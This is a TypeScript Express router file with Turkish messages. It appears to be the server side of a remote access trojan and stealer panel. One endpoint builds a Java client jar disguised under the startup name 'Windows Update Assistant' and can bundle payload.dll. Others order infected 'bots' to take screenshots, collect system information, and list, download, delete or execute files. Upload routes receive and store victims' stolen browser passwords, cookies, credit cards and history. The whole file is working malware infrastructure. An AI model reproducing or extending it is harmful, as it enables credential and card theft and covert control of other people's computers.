import { Router, Request, Response } from 'express';
import { pool } from '../db';
import { authenticateToken, AuthRequest } from '../middleware/auth';
import { sendAlertToClients } from '../index';
import multer from 'multer';
import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

const upload = multer({ dest: '/tmp/uploads/' });

const router = Router();

function getBotScreenshotDir(botId: number): string {
  const dir = path.join('/data', 'bots', String(botId), 'screenshots');
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

router.get('/', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;

  try {
    const result = await pool.query(
      'SELECT * FROM bots WHERE user_id = $1 ORDER BY id ASC',
      [userId]
    );
    return res.json({ success: true, bots: result.rows });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.delete('/:id', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const botId = req.params.id;

  try {
    await pool.query('DELETE FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (userId) {
      const { broadcastBotsUpdate, broadcastDiscordTokensUpdate } = require('../index');
      await broadcastBotsUpdate(userId);
      await broadcastDiscordTokensUpdate(userId);
    }
    return res.json({ success: true, message: 'Bot silindi.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/alert', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const { title, message, type, duration, targetPc } = req.body;

  try {
    const { sendAlertToClients } = require('../index');
    await sendAlertToClients({
      title: title || '',
      message: message || '',
      type: type || 'custom',
      duration: typeof duration === 'number' ? duration : 10000,
      targetPc: targetPc && targetPc.trim() !== '' ? targetPc.trim() : 'ALL'
    });
    return res.json({ success: true, message: 'Komut başarıyla gönderildi.' });
  } catch (error) {
    console.error('Trigger alert endpoint error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/builder/generate', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response | void> => {
  try {
    const { serverUrl, gateKey, fileName, startupName } = req.body;

    const targetServerUrl = (serverUrl && serverUrl.trim()) ? serverUrl.trim() : 'http://localhost:3434';
    const targetGateKey = (gateKey && gateKey.trim()) ? gateKey.trim() : ((req.user as any)?.gate_key || (req.user as any)?.gateKey || 'GATE-DEFAULT');
    const targetStartupName = (startupName && startupName.trim()) ? startupName.trim() : 'Windows Update Assistant';

    const rawFileName = fileName || 'Client.jar';
    const downloadName = rawFileName.endsWith('.jar') ? rawFileName : `${rawFileName}.jar`;

    const possibleClientDirs = [
      path.join(process.cwd(), 'client'),
      path.join(process.cwd(), '..', 'client'),
      '/app/client'
    ];

    let clientSourceDir = '';
    for (const d of possibleClientDirs) {
      if (fs.existsSync(path.join(d, 'Client.java'))) {
        clientSourceDir = d;
        break;
      }
    }

    if (!clientSourceDir) {
      console.error('Client source dir not found!');
      return res.status(500).json({ success: false, message: 'Client kaynak dosyaları bulunamadı.' });
    }

    const buildId = `build_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const tempDir = path.join('/tmp', buildId);
    fs.mkdirSync(tempDir, { recursive: true });

    fs.cpSync(clientSourceDir, tempDir, { recursive: true });

    const clientJavaPath = path.join(tempDir, 'Client.java');
    if (fs.existsSync(clientJavaPath)) {
      let content = fs.readFileSync(clientJavaPath, 'utf-8');
      content = content.replace(/private static final String SERVER_URL = "[^"]*";/, `private static final String SERVER_URL = "${targetServerUrl}";`);
      content = content.replace(/private static final String GATE_KEY = "[^"]*";/, `private static final String GATE_KEY = "${targetGateKey}";`);
      fs.writeFileSync(clientJavaPath, content, 'utf-8');
    }

    const startupJavaPath = path.join(tempDir, 'StartupManager.java');
    if (fs.existsSync(startupJavaPath)) {
      let content = fs.readFileSync(startupJavaPath, 'utf-8');
      content = content.replace(/private static final String REG_NAME = "[^"]*";/, `private static final String REG_NAME = "${targetStartupName}";`);
      fs.writeFileSync(startupJavaPath, content, 'utf-8');
    }

    execSync('javac -encoding UTF-8 *.java', { cwd: tempDir, stdio: 'pipe' });

    let extraFiles = '';
    if (fs.existsSync(path.join(tempDir, 'ce.exe'))) extraFiles += ' ce.exe';
    if (fs.existsSync(path.join(tempDir, 'payload.dll'))) extraFiles += ' payload.dll';

    execSync(`jar cvfe Client.jar Client *.class${extraFiles}`, { cwd: tempDir, stdio: 'pipe' });

    const jarPath = path.join(tempDir, 'Client.jar');
    if (!fs.existsSync(jarPath)) {
      throw new Error('JAR file was not created.');
    }

    const jarBuffer = fs.readFileSync(jarPath);

    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch (_) {}

    res.setHeader('Content-Type', 'application/java-archive');
    res.setHeader('Content-Disposition', `attachment; filename="${downloadName}"`);
    return res.send(jarBuffer);
  } catch (error: any) {
    console.error('Builder generation error:', error?.message || error);
    if (error?.stderr) console.error('Build stderr:', error.stderr.toString());
    return res.status(500).json({ success: false, message: 'Client derlenemedi. Sunucu hatası.' });
  }
});

router.post('/screenshot', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const { pcName } = req.body;

  if (!pcName) {
    return res.status(400).json({ success: false, message: 'pcName gerekli.' });
  }

  try {
    const botRes = await pool.query(
      'SELECT id FROM bots WHERE user_id = $1 AND LOWER(TRIM(pc_name)) = LOWER(TRIM($2))',
      [userId, pcName]
    );
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }

    const { sendAlertToClients } = require('../index');
    await sendAlertToClients({
      type: 'screenshot',
      targetPc: pcName.trim()
    });

    return res.json({ success: true, message: 'Screenshot komutu gönderildi, bekleniyor...' });
  } catch (error) {
    console.error('Screenshot command error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/screenshot/upload', async (req: Request, res: Response): Promise<Response> => {
  const { gateKey, pcName, image } = req.body;

  if (!gateKey || !pcName || !image) {
    return res.status(400).json({ success: false, message: 'Eksik parametre.' });
  }

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Geçersiz gate key.' });
    }
    const userId = userRes.rows[0].id;

    const botRes = await pool.query(
      'SELECT id FROM bots WHERE user_id = $1 AND LOWER(TRIM(pc_name)) = LOWER(TRIM($2))',
      [userId, pcName]
    );
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }
    const botId = botRes.rows[0].id;

    const screenshotDir = getBotScreenshotDir(botId);
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `screenshot_${timestamp}.png`;
    const filepath = path.join(screenshotDir, filename);

    const imageBuffer = Buffer.from(image, 'base64');
    fs.writeFileSync(filepath, imageBuffer);

    const imageUrl = `/api/bots/screenshots/${botId}/${filename}`;

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`screenshot_ready_${userId}`, {
        botId,
        pcName: pcName.trim(),
        imageUrl,
        filename,
        timestamp: new Date().toISOString()
      });
    }

    return res.json({ success: true, imageUrl });
  } catch (error) {
    console.error('Screenshot upload error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.get('/screenshots/:botId', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }

    const screenshotDir = path.join('/data', 'bots', String(botId), 'screenshots');
    if (!fs.existsSync(screenshotDir)) {
      return res.json({ success: true, screenshots: [] });
    }

    const files = fs.readdirSync(screenshotDir)
      .filter(f => f.endsWith('.png'))
      .sort()
      .reverse();

    const screenshots = files.map(f => ({
      filename: f,
      url: `/api/bots/screenshots/${botId}/${f}`,
      timestamp: f.replace('screenshot_', '').replace('.png', '').replace(/-/g, ':').replace('T', ' ').substring(0, 19)
    }));

    return res.json({ success: true, screenshots });
  } catch (error) {
    console.error('Screenshot list error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.get('/screenshots/:botId/:filename', authenticateToken, async (req: AuthRequest, res: Response): Promise<void> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);
  const { filename } = req.params;

  if (!filename.endsWith('.png') || filename.includes('..') || filename.includes('/')) {
    res.status(400).json({ success: false, message: 'Geçersiz dosya.' });
    return;
  }

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
      return;
    }

    const filepath = path.join('/data', 'bots', String(botId), 'screenshots', filename);
    if (!fs.existsSync(filepath)) {
      res.status(404).json({ success: false, message: 'Dosya bulunamadı.' });
      return;
    }

    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    fs.createReadStream(filepath).pipe(res);
  } catch (error) {
    res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.delete('/screenshots/:botId/:filename', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);
  const { filename } = req.params;

  if (!filename.endsWith('.png') || filename.includes('..') || filename.includes('/')) {
    return res.status(400).json({ success: false, message: 'Geçersiz dosya.' });
  }

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }

    const filepath = path.join('/data', 'bots', String(botId), 'screenshots', filename);
    if (fs.existsSync(filepath)) {
      fs.unlinkSync(filepath);
    }

    return res.json({ success: true, message: 'Ekran görüntüsü silindi.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/sysinfo', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const { pcName } = req.body;
  if (!pcName) {
    return res.status(400).json({ success: false, message: 'pcName gerekli.' });
  }

  try {
    await sendAlertToClients({
      type: 'sysinfo',
      targetPc: pcName
    });

    return res.json({ success: true, message: 'Sistem bilgisi isteği gönderildi.' });
  } catch (error) {
    console.error('Sysinfo trigger error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.get('/sysinfo/:botId', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }

    const sysinfoPath = path.join('/data', 'bots', String(botId), 'sysinfo.json');
    if (!fs.existsSync(sysinfoPath)) {
      return res.json({ success: true, sysinfo: null });
    }

    const content = fs.readFileSync(sysinfoPath, 'utf-8');
    const sysinfo = JSON.parse(content);

    return res.json({ success: true, sysinfo });
  } catch (error) {
    console.error('Fetch sysinfo error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/sysinfo/upload', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = req.headers['authorization'] || (req.query.gateKey as string) || req.body?.gateKey;
  if (!gateKey) {
    return res.status(401).json({ success: false, message: 'Gate key eksik.' });
  }

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) {
      return res.status(403).json({ success: false, message: 'Geçersiz Gate Key.' });
    }
    const userId = userRes.rows[0].id;

    const { pcName, userName, osInfo, cpu, cpuCores, gpu, ramTotal, antivirus, disks, localIp, macAddress, motherboard, uptime } = req.body;
    if (!pcName) {
      return res.status(400).json({ success: false, message: 'Eksik veri.' });
    }

    let botRes = await pool.query('SELECT id FROM bots WHERE LOWER(TRIM(pc_name)) = LOWER(TRIM($1)) AND user_id = $2', [pcName.trim(), userId]);
    let botId: number;

    if (botRes.rows.length === 0) {
      const devKey = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
      const insertRes = await pool.query(
        'INSERT INTO bots (user_id, device_key, ip, pc_name, os_info, status) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id',
        [userId, devKey, localIp || '127.0.0.1', pcName.trim(), osInfo || 'Windows', 'online']
      );
      botId = insertRes.rows[0].id;
    } else {
      botId = botRes.rows[0].id;
    }

    const botDir = path.join('/data', 'bots', String(botId));
    if (!fs.existsSync(botDir)) {
      fs.mkdirSync(botDir, { recursive: true });
    }

    const sysinfoData = {
      botId,
      pcName,
      userName,
      osInfo,
      cpu,
      cpuCores,
      gpu,
      ramTotal,
      antivirus,
      disks,
      localIp,
      macAddress,
      motherboard,
      uptime,
      updatedAt: new Date().toISOString()
    };

    const filepath = path.join(botDir, 'sysinfo.json');
    fs.writeFileSync(filepath, JSON.stringify(sysinfoData, null, 2));

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`sysinfo_ready_${userId}`, sysinfoData);
    }

    return res.json({ success: true, message: 'Sistem bilgisi kaydedildi.' });
  } catch (error) {
    console.error('Sysinfo upload error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

function fixUtf8(str: string | undefined): string {
  if (!str) return '';
  if (/^[\x00-\x7F]*$/.test(str)) return str;
  try {
    const decoded = Buffer.from(str, 'latin1').toString('utf8');
    if (decoded && !decoded.includes('\uFFFD')) {
      return decoded;
    }
  } catch (_) {}
  return str;
}



router.post('/browser/scan', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const { pcName } = req.body;
  if (!pcName) {
    return res.status(400).json({ success: false, message: 'pcName gerekli.' });
  }

  try {
    await sendAlertToClients({
      type: 'browser_scan',
      targetPc: pcName.trim()
    });

    return res.json({ success: true, message: 'Tarayıcı tarama komutu gönderildi.' });
  } catch (error) {
    console.error('Browser scan trigger error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/alert', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const { title, message, type, duration, targetPc } = req.body;

  try {
    await sendAlertToClients({
      title: title || '',
      message: message || '',
      type: type || 'custom',
      duration: duration || 0,
      targetPc: targetPc ? String(targetPc).trim() : 'ALL'
    });

    return res.json({ success: true, message: 'Komut istemcilere başarıyla iletildi.' });
  } catch (error) {
    console.error('Alert post error:', error);
    return res.status(500).json({ success: false, message: 'Komut gönderilemedi.' });
  }
});

router.post('/browser/upload', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = (req.query.gateKey as string) || req.body?.gateKey;
  const { pcName, passwords, cookies, cards } = req.body;

  if (!gateKey) {
    return res.status(401).json({ success: false, message: 'GateKey eksik.' });
  }

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) {
      return res.status(403).json({ success: false, message: 'Geçersiz GateKey.' });
    }
    const userId = userRes.rows[0].id;

    if (!pcName) {
      return res.status(400).json({ success: false, message: 'pcName gerekli.' });
    }

    let botRes = await pool.query(
      'SELECT id FROM bots WHERE LOWER(TRIM(pc_name)) = LOWER(TRIM($1)) AND user_id = $2',
      [pcName.trim(), userId]
    );
    let botId: number;

    if (botRes.rows.length === 0) {
      const devKey = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
      const insertRes = await pool.query(
        'INSERT INTO bots (user_id, device_key, ip, pc_name, os_info, status) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id',
        [userId, devKey, '127.0.0.1', pcName.trim(), 'Windows', 'online']
      );
      botId = insertRes.rows[0].id;
    } else {
      botId = botRes.rows[0].id;
    }

    let insertCount = 0;

    if (passwords && Array.isArray(passwords)) {
      for (const pwd of passwords) {
        try {
          const host = (pwd.host || pwd.url || '').trim();
          const username = (pwd.username || pwd.user || '').trim();
          const password = (pwd.password || pwd.pass || '').trim();
          const browser = (pwd.browser || 'Unknown').trim();

          if (!host && !username && !password) continue;

          const exists = await pool.query(
            `SELECT id FROM browser_data WHERE bot_id = $1 AND data_type = 'password' AND browser = $2 AND host = $3 AND username = $4`,
            [botId, browser, host, username]
          );
          if (exists.rows.length === 0) {
            await pool.query(
              `INSERT INTO browser_data (bot_id, pc_name, data_type, browser, host, username, password) 
               VALUES ($1, $2, $3, $4, $5, $6, $7)`,
              [botId, pcName.trim(), 'password', browser, host, username, password]
            );
            insertCount++;
          }
        } catch (e) {
        }
      }
    }

    if (cookies && Array.isArray(cookies)) {
      for (const cookie of cookies) {
        try {
          const host = (cookie.host || cookie.domain || '').trim();
          const cookieName = (cookie.name || cookie.cookie_name || '').trim();
          const cookieValue = (cookie.value || cookie.cookie_value || '').trim();
          const browser = (cookie.browser || 'Unknown').trim();

          if (!host && !cookieName && !cookieValue) continue;

          const exists = await pool.query(
            `SELECT id FROM browser_data WHERE bot_id = $1 AND data_type = 'cookie' AND browser = $2 AND host = $3 AND cookie_name = $4`,
            [botId, browser, host, cookieName]
          );
          if (exists.rows.length === 0) {
            await pool.query(
              `INSERT INTO browser_data (bot_id, pc_name, data_type, browser, host, cookie_name, cookie_value) 
               VALUES ($1, $2, $3, $4, $5, $6, $7)`,
              [botId, pcName.trim(), 'cookie', browser, host, cookieName, cookieValue]
            );
            insertCount++;
          }
        } catch (e) {
        }
      }
    }

    if (cards && Array.isArray(cards)) {
      for (const card of cards) {
        try {
          const cardNumber = (card.number || card.card_number || '').trim();
          const cardHolder = (card.holder || card.card_holder || card.name || '').trim();
          const expiry = (card.expiry || '').trim();
          const browser = (card.browser || 'Unknown').trim();

          if (!cardNumber && !cardHolder) continue;

          const exists = await pool.query(
            `SELECT id FROM browser_data WHERE bot_id = $1 AND data_type = 'card' AND browser = $2 AND card_number = $3`,
            [botId, browser, cardNumber]
          );
          if (exists.rows.length === 0) {
            await pool.query(
              `INSERT INTO browser_data (bot_id, pc_name, data_type, browser, card_number, card_holder, expiry) 
               VALUES ($1, $2, $3, $4, $5, $6, $7)`,
              [botId, pcName.trim(), 'card', browser, cardNumber, cardHolder, expiry]
            );
            insertCount++;
          }
        } catch (e) {
        }
      }
    }

    const history = req.body.history;
    if (history && Array.isArray(history)) {
      for (const h of history) {
        try {
          const histUrl = (h.host || h.url || '').trim();
          const histTitle = (h.title || h.username || '').trim();
          const histVisits = (h.visits || h.password || '1').toString().trim();
          const browser = (h.browser || 'Unknown').trim();

          if (!histUrl) continue;

          const exists = await pool.query(
            `SELECT id FROM browser_data WHERE bot_id = $1 AND data_type = 'history' AND browser = $2 AND host = $3`,
            [botId, browser, histUrl]
          );
          if (exists.rows.length === 0) {
            await pool.query(
              `INSERT INTO browser_data (bot_id, pc_name, data_type, browser, host, username, password) 
               VALUES ($1, $2, $3, $4, $5, $6, $7)`,
              [botId, pcName.trim(), 'history', browser, histUrl, histTitle, histVisits]
            );
            insertCount++;
          }
        } catch (e) {
        }
      }
    }

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`browser_data_ready_${userId}`, {
        botId,
        pcName: pcName.trim(),
        count: insertCount
      });
    }

    return res.json({ success: true, message: `${insertCount} kayıt eklendi.` });
  } catch (error) {
    console.error('Browser data upload error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.get('/browser/data/:botId', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);
  const dataType = req.query.type as string;

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
    }

    let query = 'SELECT * FROM browser_data WHERE bot_id = $1';
    const params: any[] = [botId];

    if (dataType) {
      query += ' AND data_type = $2';
      params.push(dataType);
    }

    query += ' ORDER BY created_at DESC';

    const dataRes = await pool.query(query, params);

    return res.json({ success: true, data: dataRes.rows });
  } catch (error) {
    console.error('Fetch browser data error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.delete('/browser/data/:id', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const dataId = parseInt(req.params.id, 10);

  try {
    const checkRes = await pool.query(
      `SELECT bd.id FROM browser_data bd 
       JOIN bots b ON bd.bot_id = b.id 
       WHERE bd.id = $1 AND b.user_id = $2`,
      [dataId, userId]
    );

    if (checkRes.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Kayıt bulunamadı.' });
    }

    await pool.query('DELETE FROM browser_data WHERE id = $1', [dataId]);

    return res.json({ success: true, message: 'Kayıt silindi.' });
  } catch (error) {
    console.error('Delete browser data error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});


router.post('/file/command', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const userId = req.user?.id;
  const { pcName, type, path: filePath } = req.body;

  if (!pcName || !type) {
    return res.status(400).json({ success: false, message: 'pcName ve type gerekli.' });
  }

  const validTypes = ['file_list', 'file_download', 'file_delete', 'file_exec'];
  if (!validTypes.includes(type)) {
    return res.status(400).json({ success: false, message: 'Geçersiz komut tipi.' });
  }

  try {
    const { sendAlertToClients } = require('../index');
    await sendAlertToClients({
      type,
      path: filePath || '',
      targetPc: pcName.trim()
    });
    return res.json({ success: true, message: 'Komut gönderildi.' });
  } catch (error) {
    console.error('File command error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/file/file_list_result', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = (req.query.gateKey as string) || req.body?.gateKey;
  const pcName = (req.query.pcName as string) || req.body?.pcName;

  if (!gateKey) return res.status(401).json({ success: false, message: 'GateKey eksik.' });

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) return res.status(403).json({ success: false, message: 'Geçersiz GateKey.' });
    const userId = userRes.rows[0].id;

    const { success, path: dirPath, files, error, isDrives } = req.body;

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`file_list_ready_${userId}`, { pcName, success, path: dirPath, files: files || [], error, isDrives: !!isDrives });
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('File list result error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/file/file_download_result', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = (req.query.gateKey as string) || req.body?.gateKey;
  const pcName = (req.query.pcName as string) || req.body?.pcName;

  if (!gateKey) return res.status(401).json({ success: false, message: 'GateKey eksik.' });

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) return res.status(403).json({ success: false, message: 'Geçersiz GateKey.' });
    const userId = userRes.rows[0].id;

    const { success, fileName, data, path: filePath, error } = req.body;

    if (success && data && fileName) {
      const botRes = await pool.query(
        'SELECT id FROM bots WHERE LOWER(TRIM(pc_name)) = LOWER(TRIM($1)) AND user_id = $2',
        [pcName, userId]
      );

      let downloadUrl = null;
      if (botRes.rows.length > 0) {
        const botId = botRes.rows[0].id;
        const filesDir = path.join('/data', 'bots', String(botId), 'files');
        fs.mkdirSync(filesDir, { recursive: true });

        const safeFileName = path.basename(fileName);
        const destPath = path.join(filesDir, safeFileName);
        const fileBuffer = Buffer.from(data, 'base64');
        fs.writeFileSync(destPath, fileBuffer);

        downloadUrl = `/api/bots/file/serve/${botId}/${encodeURIComponent(safeFileName)}`;
      }

      const io = (req as any).app.get('io');
      if (io) {
        io.emit(`file_download_ready_${userId}`, { pcName, success: true, fileName, downloadUrl, path: filePath });
      }
    } else {
      const io = (req as any).app.get('io');
      if (io) {
        io.emit(`file_download_ready_${userId}`, { pcName, success: false, error: error || 'Bilinmeyen hata', path: filePath });
      }
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('File download result error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.get('/file/serve/:botId/:filename', authenticateToken, async (req: AuthRequest, res: Response): Promise<void> => {
  const userId = req.user?.id;
  const botId = parseInt(req.params.botId, 10);
  const filename = decodeURIComponent(req.params.filename);

  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    res.status(400).json({ success: false, message: 'Geçersiz dosya adı.' });
    return;
  }

  try {
    const botRes = await pool.query('SELECT id FROM bots WHERE id = $1 AND user_id = $2', [botId, userId]);
    if (botRes.rows.length === 0) {
      res.status(404).json({ success: false, message: 'Bot bulunamadı.' });
      return;
    }

    const filePath = path.join('/data', 'bots', String(botId), 'files', filename);
    if (!fs.existsSync(filePath)) {
      res.status(404).json({ success: false, message: 'Dosya bulunamadı.' });
      return;
    }

    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    fs.createReadStream(filePath).pipe(res);
  } catch (error) {
    res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/file/file_delete_result', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = (req.query.gateKey as string) || req.body?.gateKey;
  const pcName = (req.query.pcName as string) || req.body?.pcName;

  if (!gateKey) return res.status(401).json({ success: false, message: 'GateKey eksik.' });

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) return res.status(403).json({ success: false, message: 'Geçersiz GateKey.' });
    const userId = userRes.rows[0].id;

    const { success, path: filePath, error } = req.body;

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`file_op_result_${userId}`, { pcName, op: 'delete', success, path: filePath, error });
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('File delete result error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/file/file_exec_result', async (req: Request, res: Response): Promise<Response> => {
  const gateKey = (req.query.gateKey as string) || req.body?.gateKey;
  const pcName = (req.query.pcName as string) || req.body?.pcName;

  if (!gateKey) return res.status(401).json({ success: false, message: 'GateKey eksik.' });

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) return res.status(403).json({ success: false, message: 'Geçersiz GateKey.' });
    const userId = userRes.rows[0].id;

    const { success, path: filePath, error } = req.body;

    const io = (req as any).app.get('io');
    if (io) {
      io.emit(`file_op_result_${userId}`, { pcName, op: 'exec', success, path: filePath, error });
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('File exec result error:', error);
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

export default router;